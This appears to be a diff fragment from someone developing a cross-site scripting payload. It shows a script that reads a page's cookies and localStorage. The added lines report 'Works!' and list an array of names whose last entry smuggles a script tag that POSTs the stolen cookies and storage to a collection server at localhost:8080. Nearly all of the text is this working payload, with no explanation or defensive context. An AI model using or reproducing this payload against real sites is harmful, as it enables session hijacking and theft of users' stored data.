@@ -1,4 +1,4 @@
-<script>(function() { var yourData = JSON.stringify( {cookies: document.cookie, storage: localStorage }); console.log(yourData); })();</script>
+<script>(function() { var yourData = JSON.stringify({cookies: document.cookie, storage: localStorage}); console.log(yourData); })();</script>
 
 // $.ajax({
 //   type: 'POST',
@@ -10,3 +10,7 @@
 //     console.log(data);
 //   }
 // })
+
+Works! ...
+
+["Frank", "Susan", "Horatio", "<script>(function() { var yourData = JSON.stringify({cookies: document.cookie, storage: localStorage}); console.log('sending');$.ajax({ type: 'POST', url: 'http://localhost:8080', data: yourData }); console.log('sent'); })();</script>"]
